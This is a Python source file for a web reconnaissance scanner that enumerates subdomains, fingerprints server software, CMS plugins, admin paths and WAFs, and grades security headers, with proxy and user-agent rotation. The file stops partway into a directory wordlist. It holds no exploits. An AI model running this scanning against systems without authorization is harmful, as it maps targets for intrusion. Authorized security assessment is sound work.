#!/usr/bin/env python3
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
import json
import urllib3
from tqdm import tqdm
import os
import sys
from datetime import datetime
import re
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
from bs4 import BeautifulSoup
import random
import logging
import hashlib
import argparse
from collections import defaultdict
import threading
from typing import List, Dict, Any, Optional, Set, Union, Tuple
import base64
import socket
import ssl
import ipaddress
from urllib.robotparser import RobotFileParser
from utils import url_validate_and_normalize, load_wordlist, log_error

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configure logging
LOG_FILE = 'newton_scanner.log'
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class RateLimiter:
    """Rate limiting for requests."""
    def __init__(self, requests_per_second: float = 15):
        self.requests_per_second = requests_per_second
        self.min_interval = 1.0 / requests_per_second if requests_per_second > 0 else 0
        self.last_request_time = 0
        self.lock = threading.Lock()
        
    def wait_if_needed(self):
        if self.min_interval == 0:
            return
        with self.lock:
            current_time = time.time()
            time_since_last = current_time - self.last_request_time
            if time_since_last < self.min_interval:
                sleep_time = self.min_interval - time_since_last
                time.sleep(sleep_time)
            self.last_request_time = time.time()

class HttpClient:
    """Enhanced HTTP client with better fingerprinting capabilities."""
    def __init__(self, timeout: int = 15, proxies: List[str] = None, rate_limiter: RateLimiter = None):
        self.timeout = timeout
        self.proxies = proxies or []
        self.rate_limiter = rate_limiter
        self.session = requests.Session()
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0'
        ]
    def _prepare_request(self, headers: Dict = None) -> Tuple[Dict, Optional[Dict]]:
        request_headers = headers or {}
        request_headers['User-Agent'] = random.choice(self.user_agents)
        request_headers.update({
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        })
        proxies_dict = None
        if self.proxies:
            proxy = random.choice(self.proxies)
            proxies_dict = {'http': proxy, 'https': proxy}
        return request_headers, proxies_dict
    def get(self, url: str, **kwargs) -> requests.Response:
        if self.rate_limiter:
            self.rate_limiter.wait_if_needed()
        request_headers, proxies_dict = self._prepare_request()
        # Only set timeout if not already in kwargs
        if 'timeout' not in kwargs:
            kwargs['timeout'] = self.timeout
        return self.session.get(
            url,
            headers=request_headers,
            proxies=proxies_dict,
            verify=False,
            **kwargs
        )

class SubdomainEnumerator:
    """Comprehensive subdomain enumeration with DNS and certificate transparency."""
    def __init__(self, http_client: HttpClient):
        self.http_client = http_client
        self.subdomains = set()
        
        # Extensive subdomain wordlist
        self.common_subdomains = [
            'www', 'mail', 'email', 'webmail', 'smtp', 'pop', 'imap', 'mx',
            'admin', 'administrator', 'root', 'login', 'auth', 'secure', 'ssl', 'tls',
            'ftp', 'sftp', 'ssh', 'telnet', 'test', 'testing', 'qa', 'dev', 'development',
            'staging', 'stage', 'prod', 'production', 'preprod', 'uat', 'demo',
            'api', 'rest', 'graphql', 'webhook', 'ws', 'app', 'apps', 'service',
            'mobile', 'm', 'wap', 'mobi', 'touch', 'amp',
            'cdn', 'static', 'assets', 'media', 'img', 'images', 'pics', 'photos',
            'js', 'css', 'fonts', 'videos', 'audio', 'downloads', 'files',
            'upload', 'uploads', 'download', 'storage', 'backup', 'backups',
            'blog', 'news', 'press', 'events', 'calendar', 'feeds', 'rss',
            'shop', 'store', 'ecommerce', 'cart', 'checkout', 'payment', 'billing',
            'forum', 'community', 'discuss', 'support', 'help', 'kb', 'faq',
            'docs', 'documentation', 'manual', 'wiki', 'guide', 'tutorial',
            'beta', 'alpha', 'preview', 'experimental', 'labs', 'research',
            'vpn', 'proxy', 'gateway', 'firewall', 'router', 'switch',
            'remote', 'rdp', 'vnc', 'citrix', 'terminal',
            'ns', 'ns1', 'ns2', 'ns3', 'dns', 'bind', 'named',
            'mail1', 'mail2', 'smtp1', 'smtp2', 'pop3', 'imap4',
            'panel', 'cpanel', 'whm', 'plesk', 'control', 'manage', 'dashboard',
            'monitoring', 'stats', 'analytics', 'metrics', 'grafana', 'kibana',
            'jenkins', 'ci', 'cd', 'build', 'deploy', 'git', 'svn', 'repo',
            'db', 'database', 'mysql', 'postgres', 'mongo', 'redis', 'elastic',
            'ldap', 'ad', 'sso', 'oauth', 'saml', 'iam',
            'status', 'health', 'ping', 'uptime', 'nagios', 'zabbix',
            'log', 'logs', 'syslog', 'audit', 'trace', 'debug',
            'old', 'legacy', 'archive', 'retired', 'deprecated',
            'temp', 'tmp', 'cache', 'cdn-cache', 'edge',
            'internal', 'intranet', 'extranet', 'partner', 'vendor',
            'guest', 'public', 'private', 'restricted', 'secure'
        ]
        
    def enumerate_dns(self, domain: str, concurrency: int = 25) -> Set[str]:
        """DNS-based subdomain enumeration with comprehensive wordlist."""
        found_subdomains = set()
        logger.info(f"Starting DNS enumeration for {domain} with {len(self.common_subdomains)} subdomains")
        
        def check_dns(subdomain):
            full_domain = f"{subdomain}.{domain}"
            try:
                import dns.resolver
                dns.resolver.resolve(full_domain, 'A')
                return full_domain
            except:
                return None
        
        with ThreadPoolExecutor(max_workers=concurrency) as executor:
            futures = [executor.submit(check_dns, sub) for sub in self.common_subdomains]
            for future in tqdm(as_completed(futures), total=len(self.common_subdomains), desc="DNS enumeration"):
                result = future.result()
                if result:
                    found_subdomains.add(result)
                    logger.info(f"Found subdomain: {result}")
        
        return found_subdomains
    
    def enumerate_certificate_transparency(self, domain: str) -> Set[str]:
        """Certificate transparency log enumeration."""
        found_subdomains = set()
        logger.info(f"Checking certificate transparency logs for {domain}")
        
        try:
            url = f"https://crt.sh/?q=%.{domain}&output=json"
            response = self.http_client.get(url, timeout=30)
            if response.status_code == 200:
                data = response.json()
                for entry in data:
                    name_value = entry.get('name_value', '')
                    for subdomain in name_value.split('\n'):
                        subdomain = subdomain.strip()
                        if subdomain.endswith(f'.{domain}') and '*' not in subdomain:
                            found_subdomains.add(subdomain)
                            logger.info(f"Found subdomain via CT logs: {subdomain}")
        except Exception as e:
            logger.warning(f"Certificate transparency enumeration failed: {e}")
        
        return found_subdomains
    
    def enumerate_all(self, domain: str, concurrency: int = 25) -> List[str]:
        """Comprehensive subdomain enumeration."""
        logger.info(f"Starting comprehensive subdomain enumeration for {domain}")
        all_subdomains = set()
        
        # DNS enumeration
        dns_results = self.enumerate_dns(domain, concurrency)
        all_subdomains.update(dns_results)
        
        # Certificate transparency
        ct_results = self.enumerate_certificate_transparency(domain)
        all_subdomains.update(ct_results)
        
        self.subdomains.update(all_subdomains)
        logger.info(f"Total unique subdomains discovered: {len(self.subdomains)}")
        return sorted(list(self.subdomains))

class TechnologyDetector:
    """Advanced technology stack detection and fingerprinting."""
    def __init__(self, http_client: HttpClient):
        self.http_client = http_client
        
    def detect_technology(self, url: str) -> Dict[str, Any]:
        """Comprehensive technology detection."""
        tech_info = {
            'server_info': {},
            'programming_languages': [],
            'web_frameworks': [],
            'cms_info': {},
            'javascript_libraries': [],
            'css_frameworks': [],
            'database_tech': [],
            'cdn_services': [],
            'analytics_tools': [],
            'security_tools': [],
            'hosting_info': {},
            'response_analysis': {},
            'http_headers': {},
            'cookies_analysis': [],
            'meta_information': {},
            'file_extensions_found': [],
            'error_pages': {},
            'static_site_generator': None
        }
        logger.info(f"Starting comprehensive technology detection for {url}")
        try:
            start_time = time.time()
            response = self.http_client.get(url)
            response_time = time.time() - start_time
            tech_info['response_analysis'] = {
                'status_code': response.status_code,
                'response_time_ms': round(response_time * 1000, 2),
                'content_length': len(response.content),
                'content_type': response.headers.get('content-type', ''),
                'encoding': response.encoding
            }
            tech_info['http_headers'] = dict(response.headers)
            soup = BeautifulSoup(response.text, 'html.parser')
            content_lower = response.text.lower()
            self._detect_server_technologies(tech_info, response.headers, content_lower)
            self._detect_programming_languages(tech_info, response.headers, content_lower, response.url)
            self._detect_web_frameworks(tech_info, response.headers, content_lower, soup)
            self._detect_cms_and_platforms(tech_info, content_lower, soup, response.headers)
            self._detect_javascript_libraries(tech_info, content_lower, soup)
            self._detect_css_frameworks(tech_info, content_lower)
            self._detect_database_technologies(tech_info, response.headers, content_lower)
            self._detect_cdn_services(tech_info, response.headers, content_lower)
            self._detect_analytics_tools(tech_info, content_lower)
            self._detect_security_tools(tech_info, response.headers, content_lower)
            self._detect_hosting_providers(tech_info, response.headers, content_lower)
            self._extract_meta_information(tech_info, soup)
            self._analyze_cookies(tech_info, response.cookies)
            self._detect_file_extensions(tech_info, soup, response.url)
            self._test_error_pages(tech_info, url)
            # Static site generator detection
            static_generators = {
                'Jekyll': ['jekyll', 'site powered by jekyll'],
                'Hugo': ['hugo', 'generated by hugo'],
                'Gatsby': ['gatsby', 'gatsbyjs'],
                'Next.js': ['next.js', '_next'],
                'Nuxt.js': ['nuxt.js', '__nuxt'],
                'Hexo': ['hexo'],
                'GitHub Pages': ['github.io', 'github pages'],
                'Netlify': ['netlify'],
                'Vercel': ['vercel'],
                'Pelican': ['pelican'],
                'Scully': ['scully'],
                '11ty': ['11ty', 'eleventy'],
                'Middleman': ['middleman']
            }
            found_static = None
            meta = tech_info.get('meta_information', {})
            for gen, patterns in static_generators.items():
                for pattern in patterns:
                    if pattern in content_lower:
                        found_static = gen
                        break
                if found_static:
                    break
            # Also check meta generator
            if not found_static and 'generator' in meta:
                for gen, patterns in static_generators.items():
                    if any(pat in meta['generator'].lower() for pat in patterns):
                        found_static = gen
                        break
            tech_info['static_site_generator'] = found_static
        except Exception as e:
            logger.error(f"Error during technology detection: {e}")
            tech_info['error'] = str(e)
        return tech_info
    
    def _detect_server_technologies(self, tech_info: Dict, headers: Dict, content: str):
        """Detect server and infrastructure technologies."""
        server_header = headers.get('Server', '').lower()
        
        server_info = {
            'web_server': 'Unknown',
            'version': 'Unknown',
            'operating_system': 'Unknown',
            'additional_modules': []
        }
        
        # Web server detection
        if 'nginx' in server_header:
            server_info['web_server'] = 'Nginx'
            version_match = re.search(r'nginx/([0-9.]+)', server_header)
            if version_match:
                server_info['version'] = version_match.group(1)
        elif 'apache' in server_header:
            server_info['web_server'] = 'Apache'
            version_match = re.search(r'apache/([0-9.]+)', server_header)
            if version_match:
                server_info['version'] = version_match.group(1)
        elif 'iis' in server_header:
            server_info['web_server'] = 'Microsoft IIS'
            version_match = re.search(r'iis/([0-9.]+)', server_header)
            if version_match:
                server_info['version'] = version_match.group(1)
        elif 'cloudflare' in server_header:
            server_info['web_server'] = 'Cloudflare'
        
        # Operating system detection
        if 'ubuntu' in server_header or 'debian' in server_header:
            server_info['operating_system'] = 'Linux (Debian/Ubuntu)'
        elif 'centos' in server_header or 'rhel' in server_header:
            server_info['operating_system'] = 'Linux (RHEL/CentOS)'
        elif 'win32' in server_header or 'win64' in server_header:
            server_info['operating_system'] = 'Windows'
        
        # Additional modules
        if 'mod_ssl' in server_header:
            server_info['additional_modules'].append('mod_ssl')
        if 'openssl' in server_header:
            server_info['additional_modules'].append('OpenSSL')
        if 'php' in server_header:
            server_info['additional_modules'].append('PHP module')
        
        tech_info['server_info'] = server_info
    
    def _detect_programming_languages(self, tech_info: Dict, headers: Dict, content: str, url: str):
        """Detect programming languages and runtime environments."""
        languages = []
        
        # Header-based detection
        powered_by = headers.get('X-Powered-By', '').lower()
        
        if 'php' in powered_by or 'php' in headers.get('Server', '').lower():
            php_version = re.search(r'php/([0-9.]+)', powered_by)
            if php_version:
                languages.append(f"PHP {php_version.group(1)}")
            else:
                languages.append("PHP")
        
        if 'asp.net' in powered_by:
            version_match = re.search(r'asp\.net/([0-9.]+)', powered_by)
            if version_match:
                languages.append(f"ASP.NET {version_match.group(1)}")
            else:
                languages.append("ASP.NET")
        
        if 'express' in powered_by or 'node' in headers.get('Server', '').lower():
            languages.append("Node.js")
        
        # Content-based detection
        if re.search(r'\.php(\?|$|")', content) or '<?php' in content:
            if 'PHP' not in ' '.join(languages):
                languages.append("PHP")
        
        if 'django' in content.lower() or 'csrfmiddlewaretoken' in content:
            languages.append("Python (Django)")
        elif 'flask' in content.lower():
            languages.append("Python (Flask)")
        elif 'wsgi' in content.lower():
            languages.append("Python (WSGI)")
        
        if 'laravel' in content.lower() or 'laravel_session' in content:
            languages.append("PHP (Laravel)")
        elif 'codeigniter' in content.lower():
            languages.append("PHP (CodeIgniter)")
        elif 'zend' in content.lower():
            languages.append("PHP (Zend)")
        
        if 'rails' in content.lower() or 'authenticity_token' in content:
            languages.append("Ruby on Rails")
        
        if 'spring' in content.lower() or 'jsessionid' in content:
            languages.append("Java (Spring)")
        elif '.jsp' in content or '.do' in content:
            languages.append("Java (JSP)")
        
        # ASP.NET specific detection
        if 'viewstate' in content.lower() or '__dopostback' in content.lower():
            if 'ASP.NET' not in ' '.join(languages):
                languages.append("ASP.NET")
        
        tech_info['programming_languages'] = list(set(languages))
    
    def _detect_web_frameworks(self, tech_info: Dict, headers: Dict, content: str, soup: BeautifulSoup):
        """Detect web frameworks and libraries."""
        frameworks = []
        
        # Meta generator detection
        generator = soup.find('meta', attrs={'name': 'generator'})
        if generator:
            gen_content = generator.get('content', '').lower()
            frameworks.append(f"Generator: {generator.get('content', '')}")
        
        # Framework-specific patterns
        framework_patterns = {
            'Django': ['django', 'csrfmiddlewaretoken'],
            'Flask': ['flask', 'werkzeug'],
            'Express.js': ['express'],
            'Laravel': ['laravel', '_token'],
            'CodeIgniter': ['codeigniter', 'ci_session'],
            'Symfony': ['symfony'],
            'CakePHP': ['cakephp'],
            'Yii': ['yii framework'],
            'Zend': ['zend framework'],
            'Spring Boot': ['spring boot', 'spring-boot'],
            'Struts': ['struts'],
            'ASP.NET MVC': ['asp.net mvc', '__requestverificationtoken'],
            'Ruby on Rails': ['rails', 'authenticity_token'],
            'Next.js': ['next.js', '_next'],
            'Nuxt.js': ['nuxt.js', '__nuxt'],
            'Gatsby': ['gatsby'],
            'Hugo': ['hugo'],
            'Jekyll': ['jekyll']
        }
        
        for framework, patterns in framework_patterns.items():
            if any(pattern in content.lower() for pattern in patterns):
                frameworks.append(framework)
        
        tech_info['web_frameworks'] = frameworks
    
    def _detect_cms_and_platforms(self, tech_info: Dict, content: str, soup: BeautifulSoup, headers: Dict):
        """Detect CMS and platform technologies."""
        cms_info = {
            'cms_name': None,
            'version': None,
            'themes': [],
            'plugins': [],
            'admin_paths': []
        }
        
        # WordPress detection
        if any(pattern in content.lower() for pattern in ['/wp-content/', '/wp-includes/', 'wp-json']):
            cms_info['cms_name'] = 'WordPress'
            
            # Version detection
            version_match = re.search(r'wp-includes/js/.*\?ver=([0-9.]+)', content)
            if version_match:
                cms_info['version'] = version_match.group(1)
            
            # Theme detection
            theme_match = re.search(r'/wp-content/themes/([^/]+)/', content)
            if theme_match:
                cms_info['themes'].append(theme_match.group(1))
            
            # Plugin detection
            plugin_matches = re.findall(r'/wp-content/plugins/([^/]+)/', content)
            cms_info['plugins'] = list(set(plugin_matches))
            
            cms_info['admin_paths'] = ['/wp-admin/', '/wp-login.php']
        
        # Drupal detection
        elif any(pattern in content.lower() for pattern in ['drupal.settings', '/sites/default/', 'drupal.js']):
            cms_info['cms_name'] = 'Drupal'
            version_match = re.search(r'drupal ([0-9.]+)', content.lower())
            if version_match:
                cms_info['version'] = version_match.group(1)
            cms_info['admin_paths'] = ['/user/login', '/admin']
        
        # Joomla detection
        elif any(pattern in content.lower() for pattern in ['joomla', '/media/jui/', 'com_content']):
            cms_info['cms_name'] = 'Joomla'
            cms_info['admin_paths'] = ['/administrator/']
        
        # Magento detection
        elif any(pattern in content.lower() for pattern in ['magento', '/skin/frontend/', 'mage.']):
            cms_info['cms_name'] = 'Magento'
            cms_info['admin_paths'] = ['/admin/', '/index.php/admin/']
        
        # Shopify detection
        elif any(pattern in content.lower() for pattern in ['shopify', 'cdn.shopify.com']):
            cms_info['cms_name'] = 'Shopify'
        
        # SharePoint detection
        elif any(pattern in content.lower() for pattern in ['sharepoint', '_layouts/', 'microsoftsharepoint']):
            cms_info['cms_name'] = 'Microsoft SharePoint'
        
        tech_info['cms_info'] = cms_info
    
    def _detect_javascript_libraries(self, tech_info: Dict, content: str, soup: BeautifulSoup):
        """Detect JavaScript libraries and frameworks."""
        js_libraries = []
        
        # Library patterns
        js_patterns = {
            'jQuery': ['jquery', 'jquery.min.js', '$.'],
            'React': ['react.js', 'react-dom', 'data-reactroot', '__react'],
            'Vue.js': ['vue.js', 'vue.min.js', '__vue__'],
            'Angular': ['angular.js', 'ng-app', '@angular'],
            'Angular.js': ['angular.js', 'ng-controller'],
            'Backbone.js': ['backbone.js', 'backbone.min.js'],
            'Ember.js': ['ember.js', 'ember.min.js'],
            'Knockout.js': ['knockout.js', 'ko.observable'],
            'D3.js': ['d3.js', 'd3.min.js'],
            'Chart.js': ['chart.js', 'chart.min.js'],
            'Three.js': ['three.js', 'three.min.js'],
            'Lodash': ['lodash.js', 'lodash.min.js'],
            'Underscore.js': ['underscore.js', 'underscore.min.js'],
            'Moment.js': ['moment.js', 'moment.min.js'],
            'Socket.io': ['socket.io.js', 'socket.io'],
            'GSAP': ['gsap.js', 'tweenmax.js'],
            'Swiper': ['swiper.js', 'swiper.min.js']
        }
        
        for library, patterns in js_patterns.items():
            if any(pattern in content.lower() for pattern in patterns):
                js_libraries.append(library)
        
        tech_info['javascript_libraries'] = js_libraries
    
    def _detect_css_frameworks(self, tech_info: Dict, content: str):
        """Detect CSS frameworks."""
        css_frameworks = []
        
        css_patterns = {
            'Bootstrap': ['bootstrap.css', 'bootstrap.min.css', 'btn btn-'],
            'Foundation': ['foundation.css', 'foundation.min.css'],
            'Bulma': ['bulma.css', 'bulma.min.css'],
            'Tailwind CSS': ['tailwindcss', 'tailwind.css'],
            'Materialize': ['materialize.css', 'materialize.min.css'],
            'Semantic UI': ['semantic.css', 'semantic.min.css'],
            'Pure CSS': ['pure.css', 'pure-css'],
            'Skeleton': ['skeleton.css']
        }
        
        for framework, patterns in css_patterns.items():
            if any(pattern in content.lower() for pattern in patterns):
                css_frameworks.append(framework)
        
        tech_info['css_frameworks'] = css_frameworks
    
    def _detect_database_technologies(self, tech_info: Dict, headers: Dict, content: str):
        """Detect database technologies."""
        database_tech = []
        
        # Database error patterns
        db_patterns = {
            'MySQL': ['mysql', 'mysql_fetch', 'mysql_num_rows'],
            'PostgreSQL': ['postgresql', 'postgres', 'pg_'],
            'Microsoft SQL Server': ['sql server', 'sqlserver', 'mssql'],
            'Oracle': ['oracle', 'ora-', 'oci_'],
            'MongoDB': ['mongodb', 'mongo'],
            'Redis': ['redis'],
            'SQLite': ['sqlite'],
            'MariaDB': ['mariadb']
        }
        
        for db, patterns in db_patterns.items():
            if any(pattern in content.lower() for pattern in patterns):
                database_tech.append(db)
        
        tech_info['database_tech'] = database_tech
    
    def _detect_cdn_services(self, tech_info: Dict, headers: Dict, content: str):
        """Detect CDN services."""
        cdn_services = []
        
        # Check headers for CDN indicators
        for header, value in headers.items():
            header_lower = header.lower()
            value_lower = value.lower()
            
            if 'cloudflare' in value_lower or 'cf-ray' in header_lower:
                cdn_services.append('Cloudflare')
            elif 'fastly' in value_lower:
                cdn_services.append('Fastly')
            elif 'akamai' in value_lower:
                cdn_services.append('Akamai')
            elif 'amazon' in value_lower or 'aws' in value_lower:
                cdn_services.append('Amazon CloudFront')
            elif 'maxcdn' in value_lower:
                cdn_services.append('MaxCDN')
        
        # Check content for CDN URLs
        cdn_url_patterns = {
            'Cloudflare': ['cdnjs.cloudflare.com'],
            'jsDelivr': ['cdn.jsdelivr.net'],
            'unpkg': ['unpkg.com'],
            'Google CDN': ['ajax.googleapis.com'],
            'Microsoft CDN': ['ajax.aspnetcdn.com']
        }
        
        for cdn, patterns in cdn_url_patterns.items():
            if any(pattern in content.lower() for pattern in patterns):
                cdn_services.append(cdn)
        
        tech_info['cdn_services'] = list(set(cdn_services))
    
    def _detect_analytics_tools(self, tech_info: Dict, content: str):
        """Detect analytics and tracking tools."""
        analytics_tools = []
        
        analytics_patterns = {
            'Google Analytics': ['google-analytics.com', 'gtag(', 'ga('],
            'Google Tag Manager': ['googletagmanager.com', 'gtm.js'],
            'Adobe Analytics': ['omniture.com', 'adobe analytics'],
            'Hotjar': ['hotjar.com', 'hotjar'],
            'Mixpanel': ['mixpanel.com', 'mixpanel'],
            'Segment': ['segment.com', 'analytics.js'],
            'Facebook Pixel': ['facebook.net/tr', 'fbq('],
            'Yandex Metrica': ['mc.yandex.ru'],
            'Matomo': ['matomo.js', 'piwik.js']
        }
        
        for tool, patterns in analytics_patterns.items():
            if any(pattern in content.lower() for pattern in patterns):
                analytics_tools.append(tool)
        
        tech_info['analytics_tools'] = analytics_tools
    
    def _detect_security_tools(self, tech_info: Dict, headers: Dict, content: str):
        """Detect security tools and services."""
        security_tools = []
        
        # WAF detection
        waf_headers = {
            'Cloudflare': ['cf-ray', 'cloudflare'],
            'AWS WAF': ['x-amzn-requestid'],
            'Incapsula': ['x-iinfo'],
            'ModSecurity': ['mod_security'],
            'Sucuri': ['x-sucuri']
        }
        
        for waf, header_patterns in waf_headers.items():
            for header, value in headers.items():
                if any(pattern in header.lower() or pattern in value.lower() 
                      for pattern in header_patterns):
                    security_tools.append(f"WAF: {waf}")
        
        tech_info['security_tools'] = security_tools
    
    def _detect_hosting_providers(self, tech_info: Dict, headers: Dict, content: str):
        """Detect hosting providers."""
        hosting_info = {}
        
        hosting_patterns = {
            'GitHub Pages': ['github.io'],
            'Netlify': ['netlify'],
            'Vercel': ['vercel.app'],
            'Heroku': ['herokuapp.com'],
            'AWS': ['amazonaws.com', 'aws'],
            'Google Cloud': ['googleusercontent.com', 'appspot.com'],
            'Microsoft Azure': ['azurewebsites.net', 'azure'],
            'DigitalOcean': ['digitalocean'],
            'Linode': ['linode'],
            'Vultr': ['vultr']
        }
        
        server_header = headers.get('Server', '').lower()
        for provider, patterns in hosting_patterns.items():
            if any(pattern in server_header or pattern in content.lower() for pattern in patterns):
                hosting_info['provider'] = provider
                break
        
        tech_info['hosting_info'] = hosting_info
    
    def _extract_meta_information(self, tech_info: Dict, soup: BeautifulSoup):
        """Extract meta information from HTML."""
        meta_info = {}
        
        # Title
        title = soup.find('title')
        if title:
            meta_info['title'] = title.get_text().strip()
        
        # Meta tags
        meta_tags = soup.find_all('meta')
        for meta in meta_tags:
            name = meta.get('name') or meta.get('property')
            content = meta.get('content')
            if name and content:
                meta_info[name] = content
        
        tech_info['meta_information'] = meta_info
    
    def _analyze_cookies(self, tech_info: Dict, cookies):
        """Analyze cookies for technology indicators."""
        cookies_analysis = []
        
        for cookie in cookies:
            cookie_info = {
                'name': cookie.name,
                'domain': cookie.domain,
                'path': cookie.path,
                'secure': cookie.secure,
                'httponly': hasattr(cookie, '_rest') and 'httponly' in cookie._rest.keys()
            }
            
            # Technology indicators from cookie names
            if 'phpsessid' in cookie.name.lower():
                cookie_info['technology_indicator'] = 'PHP'
            elif 'jsessionid' in cookie.name.lower():
                cookie_info['technology_indicator'] = 'Java'
            elif 'asp.net_sessionid' in cookie.name.lower():
                cookie_info['technology_indicator'] = 'ASP.NET'
            elif 'laravel_session' in cookie.name.lower():
                cookie_info['technology_indicator'] = 'Laravel'
            elif 'django' in cookie.name.lower():
                cookie_info['technology_indicator'] = 'Django'
            
            cookies_analysis.append(cookie_info)
        
        tech_info['cookies_analysis'] = cookies_analysis
    
    def _detect_file_extensions(self, tech_info: Dict, soup: BeautifulSoup, base_url: str):
        """Detect file extensions from links and resources."""
        extensions = set()
        
        # Check all links and resources
        for tag in soup.find_all(['a', 'link', 'script', 'img', 'source']):
            href = tag.get('href') or tag.get('src')
            if href:
                # Parse extension
                parsed = urlparse(href)
                path = parsed.path
                if '.' in path:
                    ext = path.split('.')[-1].lower()
                    if len(ext) <= 5:  # Reasonable extension length
                        extensions.add(f".{ext}")
        
        tech_info['file_extensions_found'] = sorted(list(extensions))
    
    def _test_error_pages(self, tech_info: Dict, base_url: str):
        """Test for custom error pages and technology indicators."""
        error_pages = {}
        test_urls = [
            f"{base_url}/nonexistent-page-404",
            f"{base_url}/test-403-forbidden",
            f"{base_url}/admin"
        ]
        for test_url in test_urls:
            try:
                response = self.http_client.get(test_url, allow_redirects=False)
                if response.status_code in [403, 404, 500]:
                    content_lower = response.text.lower()
                    if 'apache' in content_lower:
                        error_pages[response.status_code] = 'Apache error page detected'
                    elif 'nginx' in content_lower:
                        error_pages[response.status_code] = 'Nginx error page detected'
                    elif 'iis' in content_lower or 'microsoft' in content_lower:
                        error_pages[response.status_code] = 'IIS error page detected'
                    elif 'server error' in content_lower:
                        error_pages[response.status_code] = 'Generic server error page'
            except Exception:
                pass
        tech_info['error_pages'] = error_pages

class SecurityAnalyzer:
    """Comprehensive security analysis."""
    def __init__(self, http_client: HttpClient):
        self.http_client = http_client
    
    def analyze_security_headers(self, url: str) -> Dict[str, Any]:
        """Analyze security headers comprehensively."""
        logger.info(f"Analyzing security headers for {url}")
        
        try:
            response = self.http_client.get(url)
            headers = response.headers
            
            security_analysis = {
                'headers_found': {},
                'missing_headers': [],
                'recommendations': [],
                'security_score': 0,
                'max_score': 100,
                'vulnerabilities': []
            }
            
            # Security headers to check
            security_headers = {
                'Strict-Transport-Security': {
                    'description': 'Enforces HTTPS connections',
                    'good_values': ['max-age='],
                    'score': 20,
                    'recommendation': 'Add HSTS header: Strict-Transport-Security: max-age=31536000; includeSubDomains'
                },
                'Content-Security-Policy': {
                    'description': 'Prevents XSS and injection attacks',
                    'good_values': ['default-src', 'script-src'],
                    'score': 25,
                    'recommendation': 'Implement CSP: Content-Security-Policy: default-src \'self\''
                },
                'X-Frame-Options': {
                    'description': 'Prevents clickjacking attacks',
                    'good_values': ['DENY', 'SAMEORIGIN'],
                    'score': 15,
                    'recommendation': 'Add X-Frame-Options: DENY or SAMEORIGIN'
                },
                'X-Content-Type-Options': {
                    'description': 'Prevents MIME sniffing',
                    'good_values': ['nosniff'],
                    'score': 10,
                    'recommendation': 'Add X-Content-Type-Options: nosniff'
                },
                'Referrer-Policy': {
                    'description': 'Controls referrer information',
                    'good_values': ['strict-origin', 'no-referrer'],
                    'score': 10,
                    'recommendation': 'Add Referrer-Policy: strict-origin-when-cross-origin'
                },
                'Permissions-Policy': {
                    'description': 'Controls browser features',
                    'good_values': ['geolocation=', 'microphone='],
                    'score': 10,
                    'recommendation': 'Add Permissions-Policy to control browser features'
                },
                'X-XSS-Protection': {
                    'description': 'Legacy XSS protection',
                    'good_values': ['1; mode=block'],
                    'score': 5,
                    'recommendation': 'Add X-XSS-Protection: 1; mode=block'
                },
                'Expect-CT': {
                    'description': 'Certificate Transparency',
                    'good_values': ['max-age='],
                    'score': 5,
                    'recommendation': 'Add Expect-CT header for certificate transparency'
                }
            }
            
            for header_name, header_info in security_headers.items():
                if header_name in headers:
                    header_value = headers[header_name]
                    security_analysis['headers_found'][header_name] = header_value
                    
                    if any(good_val in header_value for good_val in header_info['good_values']):
                        security_analysis['security_score'] += header_info['score']
                    else:
                        security_analysis['vulnerabilities'].append({
                            'type': 'Weak Security Header',
                            'severity': 'Medium',
                            'header': header_name,
                            'current_value': header_value,
                            'recommendation': header_info['recommendation']
                        })
                else:
                    security_analysis['missing_headers'].append(header_name)
                    security_analysis['recommendations'].append(header_info['recommendation'])
                    security_analysis['vulnerabilities'].append({
                        'type': 'Missing Security Header',
                        'severity': 'Medium',
                        'header': header_name,
                        'recommendation': header_info['recommendation']
                    })
            
            # Additional security checks
            self._check_information_disclosure(security_analysis, headers)
            self._check_cookie_security(security_analysis, response.cookies)
            
            return security_analysis
            
        except Exception as e:
            logger.error(f"Error analyzing security headers for {url}: {e}")
            return {}
    
    def _check_information_disclosure(self, security_analysis: Dict, headers: Dict):
        """Check for information disclosure in headers."""
        disclosure_headers = ['Server', 'X-Powered-By', 'X-AspNet-Version', 'X-Runtime']
        
        for header in disclosure_headers:
            if header in headers:
                value = headers[header]
                if any(version_info in value.lower() for version_info in ['apache/2.', 'nginx/1.', 'php/7.', 'php/8.']):
                    security_analysis['vulnerabilities'].append({
                        'type': 'Information Disclosure',
                        'severity': 'Low',
                        'header': header,
                        'value': value,
                        'recommendation': f'Hide version information in {header} header'
                    })
    
    def _check_cookie_security(self, security_analysis: Dict, cookies):
        """Check cookie security attributes."""
        for cookie in cookies:
            cookie_vulns = []
            
            if not cookie.secure:
                cookie_vulns.append('Missing Secure flag')
            
            if not (hasattr(cookie, '_rest') and 'httponly' in cookie._rest):
                cookie_vulns.append('Missing HttpOnly flag')
            
            if cookie_vulns:
                security_analysis['vulnerabilities'].append({
                    'type': 'Insecure Cookie',
                    'severity': 'Medium',
                    'cookie_name': cookie.name,
                    'issues': cookie_vulns,
                    'recommendation': 'Set Secure and HttpOnly flags for cookies'
                })

class DirectoryFileEnumerator:
    """Advanced directory and file enumeration with comprehensive wordlists."""
    def __init__(self, http_client: HttpClient):
        self.http_client = http_client
        # Directory and file wordlists (can be expanded)
        self.common_dirs = [
